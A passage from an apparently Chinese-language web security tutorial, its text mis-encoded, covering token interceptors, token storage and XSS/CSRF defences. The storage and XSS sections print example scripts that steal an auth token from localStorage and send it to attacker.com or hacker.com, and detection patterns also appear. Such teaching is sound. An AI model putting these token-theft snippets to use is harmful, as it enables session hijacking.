const autoLogout = new AutoLogoutTrigger();

// åœ¨ç”¨æˆ·ç™»å½•æˆåŠŸåå¯åŠ¨ç›‘æ§
const startAutoLogout = () => {
    autoLogout.startMonitoring();
};

// åœ¨é€€å‡ºç™»å½•æ—¶åœæ­¢ç›‘æ§
const stopAutoLogout = () => {
    autoLogout.stopMonitoring();
};
```

---

## 5. ğŸ”§ APIè¯·æ±‚æ‹¦æˆªå™¨è®¾ç½®


### 5.1 ä»€ä¹ˆæ˜¯è¯·æ±‚æ‹¦æˆªå™¨


**ğŸ”¸ æ‹¦æˆªå™¨çš„ä½œç”¨**
è¯·æ±‚æ‹¦æˆªå™¨å°±åƒæœºåœºå®‰æ£€ï¼Œæ¯ä¸ªè¯·æ±‚åœ¨å‘é€ç»™æœåŠ¡å™¨ä¹‹å‰éƒ½è¦ç»è¿‡æ£€æŸ¥ï¼Œç¡®ä¿æºå¸¦äº†æ­£ç¡®çš„èº«ä»½è¯æ˜ï¼ˆTokenï¼‰ã€‚

```
è¯·æ±‚æ‹¦æˆªå™¨å·¥ä½œæµç¨‹ï¼š

å‘èµ·APIè¯·æ±‚
    |
è¿›å…¥è¯·æ±‚æ‹¦æˆªå™¨
    |
æ£€æŸ¥å’Œæ·»åŠ Token
    |
å‘é€åˆ°æœåŠ¡å™¨
    |
æœåŠ¡å™¨å“åº”
    |
è¿›å…¥å“åº”æ‹¦æˆªå™¨
    |
å¤„ç†å“åº”æˆ–é”™è¯¯
    |
è¿”å›ç»™è°ƒç”¨è€…
```

### 5.2 Axiosè¯·æ±‚æ‹¦æˆªå™¨


```javascript
// Axiosæ‹¦æˆªå™¨é…ç½®
import axios from 'axios';

// åˆ›å»ºaxioså®ä¾‹
const apiClient = axios.create({
    baseURL: '/api',                    // åŸºç¡€URL
    timeout: 10000,                     // è¶…æ—¶æ—¶é—´
    headers: {
        'Content-Type': 'application/json'
    }
});

// è¯·æ±‚æ‹¦æˆªå™¨ï¼šåœ¨å‘é€è¯·æ±‚å‰å¤„ç†
apiClient.interceptors.request.use(
    (config) => {
        console.log('å‘é€è¯·æ±‚:', config.method?.toUpperCase(), config.url);
        
        // è·å–Token
        const token = localStorage.getItem('authToken');
        
        if (token) {
            // æ·»åŠ Authorizationå¤´
            config.headers.Authorization = `Bearer ${token}`;
            console.log('å·²æ·»åŠ Authorizationå¤´');
        } else {
            console.warn('æ²¡æœ‰æ‰¾åˆ°Token');
        }
        
        // æ·»åŠ è¯·æ±‚æ—¶é—´æˆ³ï¼ˆç”¨äºè°ƒè¯•ï¼‰
        config.metadata = { startTime: Date.now() };
        
        return config;
    },
    (error) => {
        console.error('è¯·æ±‚æ‹¦æˆªå™¨é”™è¯¯:', error);
        return Promise.reject(error);
    }
);

// å“åº”æ‹¦æˆªå™¨ï¼šåœ¨æ”¶åˆ°å“åº”åå¤„ç†
apiClient.interceptors.response.use(
    (response) => {
        // è®¡ç®—è¯·æ±‚è€—æ—¶
        const endTime = Date.now();
        const startTime = response.config.metadata?.startTime || endTime;
        const duration = endTime - startTime;
        
        console.log(`è¯·æ±‚å®Œæˆ: ${response.config.method?.toUpperCase()} ${response.config.url} (${duration}ms)`);
        
        return response;
    },
    async (error) => {
        console.error('å“åº”æ‹¦æˆªå™¨æ•è·é”™è¯¯:', error.message);
        
        const originalRequest = error.config;
        
        // å¤„ç†401é”™è¯¯ï¼ˆTokenè¿‡æœŸï¼‰
        if (error.response?.status === 401 && !originalRequest._retry) {
            console.log('æ”¶åˆ°401å“åº”ï¼Œå°è¯•åˆ·æ–°Token');
            
            originalRequest._retry = true; // æ ‡è®°ä¸ºé‡è¯•è¯·æ±‚
            
            try {
                // åˆ·æ–°Token
                const newToken = await refreshManager.refreshToken();
                
                // æ›´æ–°è¯·æ±‚å¤´
                originalRequest.headers.Authorization = `Bearer ${newToken}`;
                
                // é‡è¯•åŸå§‹è¯·æ±‚
                console.log('ä½¿ç”¨æ–°Tokené‡è¯•è¯·æ±‚');
                return apiClient(originalRequest);
                
            } catch (refreshError) {
                console.error('Tokenåˆ·æ–°å¤±è´¥:', refreshError);
                
                // åˆ·æ–°å¤±è´¥ï¼Œæ‰§è¡Œé€€å‡ºç™»å½•
                await logoutManager.logout();
                return Promise.reject(refreshError);
            }
        }
        
        // å¤„ç†å…¶ä»–é”™è¯¯
        if (error.response?.status === 403) {
            console.error('æ²¡æœ‰æƒé™è®¿é—®æ­¤èµ„æº');
            alert('æ‚¨æ²¡æœ‰æƒé™è®¿é—®æ­¤åŠŸèƒ½');
        } else if (error.response?.status >= 500) {
            console.error('æœåŠ¡å™¨å†…éƒ¨é”™è¯¯');
            alert('æœåŠ¡å™¨æš‚æ—¶ä¸å¯ç”¨ï¼Œè¯·ç¨åé‡è¯•');
        }
        
        return Promise.reject(error);
    }
);

// å¯¼å‡ºé…ç½®å¥½çš„axioså®ä¾‹
export default apiClient;
```

### 5.3 Fetchæ‹¦æˆªå™¨å®ç°


ç”±äºFetchæ²¡æœ‰å†…ç½®æ‹¦æˆªå™¨ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å®ç°ï¼š

```javascript
// è‡ªå®šä¹‰Fetchæ‹¦æˆªå™¨
class FetchInterceptor {
    constructor() {
        this.requestInterceptors = [];
        this.responseInterceptors = [];
    }
    
    // æ·»åŠ è¯·æ±‚æ‹¦æˆªå™¨
    addRequestInterceptor(interceptor) {
        this.requestInterceptors.push(interceptor);
    }
    
    // æ·»åŠ å“åº”æ‹¦æˆªå™¨
    addResponseInterceptor(interceptor) {
        this.responseInterceptors.push(interceptor);
    }
    
    // æ‰§è¡Œæ‹¦æˆªå™¨
    async fetch(url, options = {}) {
        let config = { url, ...options };
        
        // æ‰§è¡Œè¯·æ±‚æ‹¦æˆªå™¨
        for (const interceptor of this.requestInterceptors) {
            try {
                config = await interceptor(config);
            } catch (error) {
                return Promise.reject(error);
            }
        }
        
        try {
            // å‘é€è¯·æ±‚
            const response = await fetch(config.url, config);
            
            // æ‰§è¡Œå“åº”æ‹¦æˆªå™¨
            let finalResponse = response;
            for (const interceptor of this.responseInterceptors) {
                try {
                    finalResponse = await interceptor(finalResponse, config);
                } catch (error) {
                    return Promise.reject(error);
                }
            }
            
            return finalResponse;
            
        } catch (error) {
            console.error('Fetchè¯·æ±‚å¤±è´¥:', error);
            return Promise.reject(error);
        }
    }
}

// åˆ›å»ºæ‹¦æˆªå™¨å®ä¾‹
const fetchClient = new FetchInterceptor();

// æ·»åŠ Tokenè¯·æ±‚æ‹¦æˆªå™¨
fetchClient.addRequestInterceptor((config) => {
    console.log('Fetchè¯·æ±‚æ‹¦æˆªå™¨:', config.url);
    
    const token = localStorage.getItem('authToken');
    
    if (token) {
        config.headers = {
            ...config.headers,
            'Authorization': `Bearer ${token}`
        };
    }
    
    // æ·»åŠ é»˜è®¤Content-Type
    if (!config.headers['Content-Type']) {
        config.headers['Content-Type'] = 'application/json';
    }
    
    return config;
});

// æ·»åŠ å“åº”æ‹¦æˆªå™¨
fetchClient.addResponseInterceptor(async (response, config) => {
    console.log('Fetchå“åº”æ‹¦æˆªå™¨:', response.status, config.url);
    
    // å¤„ç†401é”™è¯¯
    if (response.status === 401) {
        console.log('401é”™è¯¯ï¼Œå°è¯•åˆ·æ–°Token');
        
        try {
            const newToken = await refreshManager.refreshToken();
            
            // é‡è¯•è¯·æ±‚
            const retryConfig = {
                ...config,
                headers: {
                    ...config.headers,
                    'Authorization': `Bearer ${newToken}`
                }
            };
            
            return await fetch(retryConfig.url, retryConfig);
            
        } catch (error) {
            console.error('Tokenåˆ·æ–°å¤±è´¥');
            await logoutManager.logout();
            throw error;
        }
    }
    
    return response;
});

// ä½¿ç”¨ç¤ºä¾‹
const fetchUserData = async () => {
    try {
        const response = await fetchClient.fetch('/api/user/info');
        
        if (response.ok) {
            const data = await response.json();
            console.log('ç”¨æˆ·æ•°æ®:', data);
            return data;
        } else {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
    } catch (error) {
        console.error('è·å–ç”¨æˆ·æ•°æ®å¤±è´¥:', error);
    }
};
```

---

## 6. ğŸ”’ Tokenå­˜å‚¨å®‰å…¨æ€§å¯¹æ¯”


### 6.1 å„ç§å­˜å‚¨æ–¹å¼çš„å®‰å…¨å¯¹æ¯”


```
å®‰å…¨æ€§å¯¹æ¯”è¡¨ï¼š

å­˜å‚¨æ–¹å¼        XSSé£é™©    CSRFé£é™©    æŒä¹…æ€§    æ˜“ç”¨æ€§    æ¨èåº¦
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
LocalStorage    ğŸ”´ é«˜      ğŸŸ¢ æ—        ğŸŸ¢ å¥½     ğŸŸ¢ å¥½     ğŸŸ¡ ä¸­ç­‰
SessionStorage  ğŸ”´ é«˜      ğŸŸ¢ æ—        ğŸ”´ å·®     ğŸŸ¢ å¥½     ğŸŸ¡ ä¸­ç­‰  
Cookie(HttpOnly) ğŸŸ¢ ä½     ğŸ”´ é«˜       ğŸŸ¢ å¥½     ğŸŸ¡ ä¸­     ğŸŸ¢ æ¨è
Memory(å˜é‡)    ğŸŸ¢ æ—       ğŸŸ¢ æ—        ğŸ”´ å·®     ğŸ”´ å·®     ğŸŸ¡ ç‰¹æ®Šåœºæ™¯
```

### 6.2 è¯¦ç»†å®‰å…¨åˆ†æ


**ğŸ”¸ LocalStorageå®‰å…¨åˆ†æ**

```javascript
// LocalStorageçš„å®‰å…¨é—®é¢˜æ¼”ç¤º
console.log('LocalStorageå®‰å…¨æµ‹è¯•ï¼š');

// XSSæ”»å‡»å¯ä»¥è½»æ˜“è·å–Token
const stolenToken = localStorage.getItem('authToken');
console.log('æ¶æ„è„šæœ¬å¯ä»¥è·å–åˆ°Token:', stolenToken ? 'æ˜¯' : 'å¦');

// æ”»å‡»è€…å¯ä»¥æ³¨å…¥çš„æ¶æ„ä»£ç ç¤ºä¾‹
const maliciousCode = `
// æ¶æ„è„šæœ¬å¯ä»¥è¿™æ ·çªƒå–Token
const token = localStorage.getItem('authToken');
// å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
});
`;

// é˜²æŠ¤æªæ–½
const secureLocalStorage = {
    // åŠ å¯†å­˜å‚¨ï¼ˆåŸºç¡€ç¤ºä¾‹ï¼Œå®é™…åº”ç”¨éœ€è¦æ›´å¼ºçš„åŠ å¯†ï¼‰
    setSecure: (key, value) => {
        const encrypted = btoa(value); // ç®€å•Base64ç¼–ç ï¼Œå®é™…åº”ä½¿ç”¨AESç­‰
        localStorage.setItem(key, encrypted);
    },
    
    getSecure: (key) => {
        const encrypted = localStorage.getItem(key);
        return encrypted ? atob(encrypted) : null;
    },
    
    // æ·»åŠ å®Œæ•´æ€§æ£€æŸ¥
    setWithIntegrity: (key, value) => {
        const data = {
            value: value,
            timestamp: Date.now(),
            checksum: this.calculateChecksum(value)
        };
        localStorage.setItem(key, JSON.stringify(data));
    },
    
    calculateChecksum: (value) => {
        // ç®€å•æ ¡éªŒå’Œï¼Œå®é™…åº”ä½¿ç”¨æ›´å¼ºçš„å“ˆå¸Œç®—æ³•
        return btoa(value).length;
    }
};
```

**ğŸ”¸ Cookieå®‰å…¨åˆ†æ**

```javascript
// Cookieå®‰å…¨é…ç½®
const secureCookieManager = {
    // è®¾ç½®å®‰å…¨Cookie
    setSecureCookie: (name, value, options = {}) => {
        const defaults = {
            httpOnly: true,      // é˜²æ­¢JavaScriptè®¿é—®ï¼ˆåªèƒ½åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®ï¼‰
            secure: true,        // åªåœ¨HTTPSä¸‹ä¼ è¾“
            sameSite: 'Strict',  // é˜²æ­¢CSRFæ”»å‡»
            maxAge: 3600,        // 1å°æ—¶è¿‡æœŸ
            path: '/'            // è·¯å¾„é™åˆ¶
        };
        
        const config = { ...defaults, ...options };
        
        // æ³¨æ„ï¼šhttpOnlyå’Œsecureåªèƒ½åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®
        let cookieString = `${name}=${value}`;
        cookieString += `; Max-Age=${config.maxAge}`;
        cookieString += `; Path=${config.path}`;
        cookieString += `; SameSite=${config.sameSite}`;
        
        if (location.protocol === 'https:') {
            cookieString += '; Secure';
        }
        
        document.cookie = cookieString;
    },
    
    // CSRFé˜²æŠ¤ç¤ºä¾‹
    generateCSRFToken: () => {
        const token = Math.random().toString(36).substring(2);
        document.cookie = `csrf-token=${token}; Path=/; SameSite=Strict`;
        return token;
    }
};
```

### 6.3 æœ€ä½³å®‰å…¨å®è·µ


```javascript
// ç»¼åˆå®‰å…¨æ–¹æ¡ˆ
class SecureTokenManager {
    constructor() {
        this.storage = this.detectBestStorage();
        this.csrfToken = null;
    }
    
    // æ£€æµ‹æœ€ä½³å­˜å‚¨æ–¹å¼
    detectBestStorage() {
        console.log('æ£€æµ‹æœ€ä½³Tokenå­˜å‚¨æ–¹å¼...');
        
        // æ£€æŸ¥æ˜¯å¦æ”¯æŒsecure cookie
        if (this.supportsSecureCookie()) {
            console.log('ä½¿ç”¨Secure Cookieå­˜å‚¨');
            return 'secureCookie';
        }
        
        // æ£€æŸ¥æ˜¯å¦ä¸ºHTTPS
        if (location.protocol === 'https:') {
            console.log('HTTPSç¯å¢ƒï¼Œä½¿ç”¨SessionStorage');
            return 'sessionStorage';
        }
        
        console.log('ä½¿ç”¨å†…å­˜å­˜å‚¨ï¼ˆæœ€å®‰å…¨ä½†ä½“éªŒå·®ï¼‰');
        return 'memory';
    }
    
    // æ£€æŸ¥æ˜¯å¦æ”¯æŒå®‰å…¨Cookie
    supportsSecureCookie() {
        return location.protocol === 'https:' && 
               document.cookie !== undefined;
    }
    
    // å­˜å‚¨Token
    storeToken(token) {
        switch (this.storage) {
            case 'secureCookie':
                this.storeInSecureCookie(token);
                break;
            case 'sessionStorage':
                this.storeInSessionStorage(token);
                break;
            case 'memory':
                this.storeInMemory(token);
                break;
            default:
                console.error('æœªçŸ¥å­˜å‚¨æ–¹å¼');
        }
    }
    
    // å®‰å…¨Cookieå­˜å‚¨
    storeInSecureCookie(token) {
        // å®é™…åº”ç”¨ä¸­ï¼Œè¿™åº”è¯¥åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®HttpOnly Cookie
        secureCookieManager.setSecureCookie('auth-token', token, {
            maxAge: 3600,
            sameSite: 'Strict'
        });
    }
    
    // SessionStorageå­˜å‚¨ï¼ˆæ·»åŠ åŠ å¯†ï¼‰
    storeInSessionStorage(token) {
        const encrypted = this.encrypt(token);
        sessionStorage.setItem('encrypted-token', encrypted);
    }
    
    // å†…å­˜å­˜å‚¨
    storeInMemory(token) {
        this.memoryToken = token;
        
        // è®¾ç½®è‡ªåŠ¨æ¸…ç†
        setTimeout(() => {
            this.memoryToken = null;
            console.log('å†…å­˜Tokenå·²è‡ªåŠ¨æ¸…ç†');
        }, 3600000); // 1å°æ—¶
    }
    
    // ç®€å•åŠ å¯†ï¼ˆå®é™…åº”ä½¿ç”¨æ›´å¼ºçš„ç®—æ³•ï¼‰
    encrypt(text) {
        return btoa(text.split('').reverse().join(''));
    }
    
    // ç®€å•è§£å¯†
    decrypt(encrypted) {
        return atob(encrypted).split('').reverse().join('');
    }
    
    // è·å–Token
    getToken() {
        switch (this.storage) {
            case 'secureCookie':
                return this.getFromCookie();
            case 'sessionStorage':
                const encrypted = sessionStorage.getItem('encrypted-token');
                return encrypted ? this.decrypt(encrypted) : null;
            case 'memory':
                return this.memoryToken;
            default:
                return null;
        }
    }
    
    // ä»Cookieè·å–ï¼ˆå®é™…åº”ç”¨ä¸­å¯èƒ½éœ€è¦æœåŠ¡å™¨ç«¯æ”¯æŒï¼‰
    getFromCookie() {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'auth-token') {
                return value;
            }
        }
        return null;
    }
    
    // æ¸…é™¤Token
    clearToken() {
        switch (this.storage) {
            case 'secureCookie':
                document.cookie = 'auth-token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
                break;
            case 'sessionStorage':
                sessionStorage.removeItem('encrypted-token');
                break;
            case 'memory':
                this.memoryToken = null;
                break;
        }
    }
}

// ä½¿ç”¨å®‰å…¨Tokenç®¡ç†å™¨
const secureTokenManager = new SecureTokenManager();
```

---

## 7. ğŸ›¡ï¸ XSSå’ŒCSRFé˜²æŠ¤


### 7.1 XSSæ”»å‡»ä¸é˜²æŠ¤


**ğŸ”¸ ä»€ä¹ˆæ˜¯XSSæ”»å‡»ï¼Ÿ**
XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰å°±åƒæœ‰äººåœ¨ä½ å®¶é‡Œå·å·å®‰è£…äº†çªƒå¬å™¨ï¼Œæ¶æ„ä»£ç åœ¨ä½ çš„ç½‘é¡µä¸Šè¿è¡Œï¼Œçªƒå–ä½ çš„æ•æ„Ÿä¿¡æ¯ã€‚

```
XSSæ”»å‡»ç¤ºä¾‹ï¼š

æ¶æ„ç”¨æˆ·åœ¨è¯„è®ºä¸­è¾“å…¥ï¼š
<script>
  const token = localStorage.getItem('authToken');
  fetch('https://hacker.com/steal?token=' + token);
</script>

å½“å…¶ä»–ç”¨æˆ·æŸ¥çœ‹è¯„è®ºæ—¶ï¼Œè¿™æ®µä»£ç ä¼šæ‰§è¡Œå¹¶çªƒå–Token
```

**ğŸ”¸ XSSé˜²æŠ¤æªæ–½**

```javascript
// XSSé˜²æŠ¤å·¥å…·ç±»
class XSSProtection {
    // è¾“å…¥å†…å®¹æ¸…ç†
    sanitizeInput(input) {
        if (typeof input !== 'string') return input;
        
        const entityMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '/': '&#x2F;'
        };
        
        return input.replace(/[&<>"'\/]/g, (s) => entityMap[s]);
    }
    
    // æ£€æµ‹æ½œåœ¨çš„XSSæ”»å‡»
    detectXSS(input) {
        const dangerousPatterns = [
            /<script[^>]*>.*?<\/script>/gi,
            /javascript:/gi,
            /on\w+\s*=/gi,
            /<iframe[^>]*>.*?<\/iframe>/gi
        ];
        
        for (const pattern of dangerousPatterns) {
            if (pattern.test(input)) {
                console.warn('æ£€æµ‹åˆ°æ½œåœ¨XSSæ”»å‡»:', input);
                return true;
            }
        }
        
        return false;
    }
    
    // å®‰å…¨åœ°è®¾ç½®HTMLå†…å®¹
    setSecureHTML(element, content) {
        if (this.detectXSS(content)) {
            console.error('å†…å®¹åŒ…å«XSSé£é™©ï¼Œå·²é˜»æ­¢è®¾ç½®');
            return false;
        }
        
        element.textContent = content; // ä½¿ç”¨textContentè€Œä¸æ˜¯innerHTML
        return true;
    }
}

// å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰å»ºè®®
const cspRecommendations = {
    // æ¨èçš„CSPå¤´
    recommended: {
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'", // ç”Ÿäº§ç¯å¢ƒåº”é¿å…unsafe-inline
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data: https:",
        'font-src': "'self'",
        'connect-src': "'self'"
    },
    
    // ç”ŸæˆCSPå­—ç¬¦ä¸²
    generateCSP() {
        const policies = [];
        for (const [directive, sources] of Object.entries(this.recommended)) {
            policies.push(`${directive} ${sources}`);
        }
        return policies.join('; ');
    }
};

// XSSé˜²æŠ¤å®ä¾‹
const xssProtection = new XSSProtection();

// ä½¿ç”¨ç¤ºä¾‹
const handleUserInput = (userInput) => {
    // æ£€æµ‹XSS
    if (xssProtection.detectXSS(userInput)) {
        alert('è¾“å…¥å†…å®¹åŒ…å«ä¸å®‰å…¨å­—ç¬¦ï¼Œè¯·æ£€æŸ¥');
        return;
    }
    
    // æ¸…ç†è¾“å…¥
    const cleanInput = xssProtection.sanitizeInput(userInput);
    
    // å®‰å…¨æ˜¾ç¤º
    const displayElement = document.getElementById('user-content');
    xssProtection.setSecureHTML(displayElement, cleanInput);
};
```

### 7.2 CSRFæ”»å‡»ä¸é˜²æŠ¤


**ğŸ”¸ ä»€ä¹ˆæ˜¯CSRFæ”»å‡»ï¼Ÿ**
CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰å°±åƒæœ‰äººå†’å……ä½ çš„èº«ä»½å»é“¶è¡Œå–é’±ï¼Œæ”»å‡»è€…åˆ©ç”¨ä½ å·²ç»ç™»å½•çš„çŠ¶æ€ï¼Œåœ¨ä½ ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæ“ä½œã€‚

```
CSRFæ”»å‡»æµç¨‹ï¼š

1. ç”¨æˆ·ç™»å½•Aç½‘ç«™ï¼Œè·å¾—Cookie
2. ç”¨æˆ·è®¿é—®Bç½‘ç«™ï¼ˆæ¶æ„ç½‘ç«™ï¼‰
3. Bç½‘ç«™åŒ…å«æŒ‡å‘Aç½‘ç«™çš„æ¶æ„è¯·æ±‚
4. æµè§ˆå™¨è‡ªåŠ¨æºå¸¦Aç½‘ç«™çš„Cookieå‘é€è¯·æ±‚
5. Aç½‘ç«™æ”¶åˆ°å¸¦æœ‰æœ‰æ•ˆCookieçš„è¯·æ±‚ï¼Œè¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·æ“ä½œ
```

**ğŸ”¸ CSRFé˜²æŠ¤æªæ–½**

```javascript
// CSRFé˜²æŠ¤ç®¡ç†å™¨
class CSRFProtection {
    constructor() {
        this.csrfToken = null;
        this.init();
    }
    
    // åˆå§‹åŒ–CSRFä¿æŠ¤
    init() {
        this.csrfToken = this.generateCSRFToken();
        this.addTokenToForms();
        this.setupAjaxInterceptor();
    }
    
    // ç”ŸæˆCSRFä»¤ç‰Œ
    generateCSRFToken() {
        const array = new Uint8Array(32);
        crypto.getRandomValues(array);
        const token = Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
        
        console.log('ç”ŸæˆCSRFä»¤ç‰Œ:', token.substring(0, 16) + '...');
        
        // å­˜å‚¨åˆ°é¡µé¢ä¸Šï¼ˆé€šè¿‡metaæ ‡ç­¾ï¼‰
        let metaTag = document.querySelector('meta[name="csrf-token"]');
        if (!metaTag) {
            metaTag = document.createElement('meta');
            metaTag.name = 'csrf-token';
            document.head.appendChild(metaTag);
        }
        metaTag.content = token;
        
        return token;
    }
    
    // è·å–CSRFä»¤ç‰Œ
    getCSRFToken() {
        if (!this.csrfToken) {
            const metaTag = document.querySelector('meta[name="csrf-token"]');
            this.csrfToken = metaTag ? metaTag.content : this.generateCSRFToken();
        }
        return this.csrfToken;
    }
    
    // ä¸ºæ‰€æœ‰è¡¨å•æ·»åŠ CSRFä»¤ç‰Œ
    addTokenToForms() {
        const forms = document.querySelectorAll('form');
        
        forms.forEach(form => {
            // æ£€æŸ¥æ˜¯å¦å·²æœ‰CSRFå­—æ®µ
            let csrfInput = form.querySelector('input[name="csrf-token"]');
            
            if (!csrfInput) {
                csrfInput = document.createElement('input');
                csrfInput.type = 'hidden';
                csrfInput.name = 'csrf-token';
                form.appendChild(csrfInput);
            }
            
            csrfInput.value = this.getCSRFToken();
        });
        
        console.log(`å·²ä¸º${forms.length}ä¸ªè¡¨å•æ·»åŠ CSRFä¿æŠ¤`);
    }
    
    // è®¾ç½®Ajaxè¯·æ±‚æ‹¦æˆªå™¨
    setupAjaxInterceptor() {
        // æ‹¦æˆªfetchè¯·æ±‚
        const originalFetch = window.fetch;
        window.fetch = (url, options = {}) => {
            // åªå¯¹ä¿®æ”¹æ•°æ®çš„è¯·æ±‚æ·»åŠ CSRFä»¤ç‰Œ
            const method = options.method?.toUpperCase() || 'GET';
            if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
                options.headers = {
                    ...options.headers,
                    'X-CSRF-Token': this.getCSRFToken()
                };
            }
            
            return originalFetch(url, options);
        };
        
        // æ‹¦æˆªXMLHttpRequest
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(data) {
            const method = this._method || 'GET';
            if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method.toUpperCase())) {
                this.setRequestHeader('X-CSRF-Token', csrfProtection.getCSRFToken());
            }
            originalSend.call(this, data);
        };
        
        // è®°å½•åŸå§‹æ–¹æ³•
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
            this._method = method;
            return originalOpen.call(this, method, url, async, user, password);
        };
        
        console.log('Ajaxæ‹¦æˆªå™¨å·²è®¾ç½®');
    }
    
    // éªŒè¯è¯·æ±‚æ¥æº
    validateOrigin(request) {
        const origin = request.headers.get('Origin');
        const referer = request.headers.get('Referer');
        const allowedOrigins = [
            window.location.origin,
            // æ·»åŠ å…¶ä»–å…è®¸çš„æ¥æº
        ];
        
        if (origin && !allowedOrigins.includes(origin)) {
            console.warn('è¯·æ±‚æ¥æºéªŒè¯å¤±è´¥:', origin);
            return false;
        }
        
        return true;
    }
}

// SameSite Cookieé…ç½®
const sameSiteManager = {
    // è®¾ç½®SameSite Cookie
    setSameSiteCookie(name, value, sameSite = 'Strict') {
        const expires = new Date();
        expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000); // 24å°æ—¶
        
        let cookieString = `${name}=${value}`;
        cookieString += `; expires=${expires.toUTCString()}`;
        cookieString += `; path=/`;
        cookieString += `; SameSite=${sameSite}`;
        
        if (location.protocol === 'https:') {
            cookieString += '; Secure';
        }
        
        document.cookie = cookieString;
        console.log(`å·²è®¾ç½®SameSite Cookie: ${name} (${sameSite})`);
    },
    
    // SameSiteé€‰é¡¹è¯´æ˜
    sameSiteOptions: {
        'Strict': 'æœ€ä¸¥æ ¼ï¼Œå®Œå…¨é˜»æ­¢è·¨ç«™è¯·æ±‚æºå¸¦Cookie',
        'Lax': 'ä¸­ç­‰ï¼Œå…è®¸éƒ¨åˆ†è·¨ç«™è¯·æ±‚ï¼ˆå¦‚é“¾æ¥è·³è½¬ï¼‰',
        'None': 'æœ€å®½æ¾ï¼Œå…è®¸æ‰€æœ‰è·¨ç«™è¯·æ±‚ï¼ˆéœ€è¦Secureï¼‰'
    }
};

// åˆ›å»ºCSRFä¿æŠ¤å®ä¾‹
const csrfProtection = new CSRFProtection();
```

### 7.3 ç»¼åˆå®‰å…¨é˜²æŠ¤æ–¹æ¡ˆ


```javascript
// ç»¼åˆå®‰å…¨é˜²æŠ¤ç®¡ç†å™¨
class ComprehensiveSecurityManager {
    constructor() {
        this.xssProtection = new XSSProtection();
        this.csrfProtection = new CSRFProtection();
        this.setupSecurityHeaders();
        this.enableSecurityMonitoring();
    }
    
    // è®¾ç½®å®‰å…¨å“åº”å¤´
    setupSecurityHeaders() {
        const securityHeaders = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
        };
        
        console.log('æ¨èçš„å®‰å…¨å“åº”å¤´:', securityHeaders);
    }
    
    // å¯ç”¨å®‰å…¨ç›‘æ§
    enableSecurityMonitoring() {
        // ç›‘æ§å¯ç–‘æ´»åŠ¨
        window.addEventListener('error', (event) => {
            if (event.message.includes('script')) {
                console.warn('æ£€æµ‹åˆ°å¯ç–‘è„šæœ¬é”™è¯¯:', event);
                this.reportSecurityIncident('script_error', event);
            }
        });
        
        // ç›‘æ§é¡µé¢ä¿®æ”¹
        const observer = new MutationObserver((mutations) => {
            mutations.forEach(mutation => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(node => {
                        if (node.tagName === 'SCRIPT') {
                            console.warn('æ£€æµ‹åˆ°åŠ¨æ€æ·»åŠ çš„è„šæœ¬æ ‡ç­¾');
                            this.reportSecurityIncident('dynamic_script', node);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        console.log('å®‰å…¨ç›‘æ§å·²å¯ç”¨');
    }
    
    // æŠ¥å‘Šå®‰å…¨äº‹ä»¶
    reportSecurityIncident(type, details) {
        const incident = {
            type: type,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            details: details
        };
        
        console.warn('å®‰å…¨äº‹ä»¶æŠ¥å‘Š:', incident);
        
        // å‘é€åˆ°å®‰å…¨ç›‘æ§æœåŠ¡
        fetch('/api/security/report', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': this.csrfProtection.getCSRFToken()
            },
            body: JSON.stringify(incident)
        }).catch(error => {
            console.error('å®‰å…¨äº‹ä»¶æŠ¥å‘Šå¤±è´¥:', error);
        });
    }
    
    // å®‰å…¨æ£€æŸ¥æ¸…å•
    performSecurityAudit() {
        const checklist = {
            'HTTPSåè®®': location.protocol === 'https:',
            'CSPå¤´è®¾ç½®': this.checkCSP(),
            'CSRFä¿æŠ¤': this.csrfProtection.getCSRFToken() !== null,
            'XSSé˜²æŠ¤': true, // å‡è®¾å·²å®æ–½
            'Cookieå®‰å…¨': this.checkCookieSecurity(),
            'æ•æ„Ÿæ•°æ®åŠ å¯†': this.checkDataEncryption()
        };
        
        console.table(checklist);
        
        const passedChecks = Object.values(checklist).filter(Boolean).length;
        const totalChecks = Object.keys(checklist).length;
        
        console.log(`å®‰å…¨æ£€æŸ¥é€šè¿‡ç‡: ${passedChecks}/${totalChecks} (${(passedChecks/totalChecks*100).toFixed(1)}%)`);
